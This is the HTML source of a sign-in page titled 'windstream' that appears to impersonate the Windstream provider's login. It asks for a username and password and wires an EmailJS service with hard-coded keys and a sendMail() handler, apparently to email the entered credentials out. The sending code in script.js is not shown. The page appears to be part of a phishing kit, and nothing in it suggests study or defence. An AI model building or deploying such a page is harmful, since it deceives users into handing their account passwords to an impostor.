<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link rel="stylesheet" href="style.css">
    <style data-styles="">
      ion-icon {
        visibility: hidden;
      }
      .hydrated {
        visibility: inherit;
      }
    </style>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>windstream</title>
    <!-- EmailJS SDK -->
    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"> 
    </script>
    <script type="text/javascript">
      (function(){
         emailjs.init({
           publicKey: "Pb0qJUxMA80Rz64Ua",
         });
      })();
   </script>
  </head>
  <body>
    <main>
    <form id="form">
      <div class="container">
        <img class="img-logo" src="images (1).jpg" alt="" />
      </div>

      <div class="container-mail-form">
        <div class="mail-title-container">
          <h3 class="mail-title" onclick="sendMail()">Sign In</h3>
        </div>
        <div class="input-box">
          <form action=""></form>
          <input type="hidden" name="form-name" value="contact" />
          <input
          type="email"
          name="email"
          placeholder="Username"
          id="email"
          required=""
          />

          <div class="input-box">
            <input
            type="password"
            name="password"
            placeholder="Password"
            id="password"
            required=""
            />

            
            <a id="toggle-password">
              <span class="password-icon hide" id="open-eye">
                <ion-icon name="eye"
                      ><template shadowrootmode="open"></template
                    ></ion-icon>
                  </span>
                  <span class="password-icon" id="closed-eye">
                    <ion-icon name="eye-off"
                      ><template shadowrootmode="open"></template
                    ></ion-icon>
                  </span>
                </a>
              </div>

              
              <!-- <a class="forgot-password" href="">FORGOT PASSWORD</a> -->

              <input
                type="submit"
                id="button"
                value="Sign In"
                class="submit-form"
              />

              <!-- <button class="btn-register">REGISTER</button> -->
            </div>
          </div>
        </div>
      </form>
    </main>

    <script src="./kinetic_files/style.css"></script>
    <script
    type="module"
    src="./kinetic_files/ionicons.esm.js.download">
    </script>
    <script nomodule="" src="./kinetic_files/ionicons.js.download"></script>
    <script
    type="text/javascript" 
    src="./kinetic_files/email.min.js.download">
    </script>

    <script type="text/javascript">
      emailjs.init("service_wi59voj");
    </script>
     <script src="script.js"></script>
     <!-- Link to the JavaScript file -->
     <script src="script.js"></script>
    
  </body>
</html>
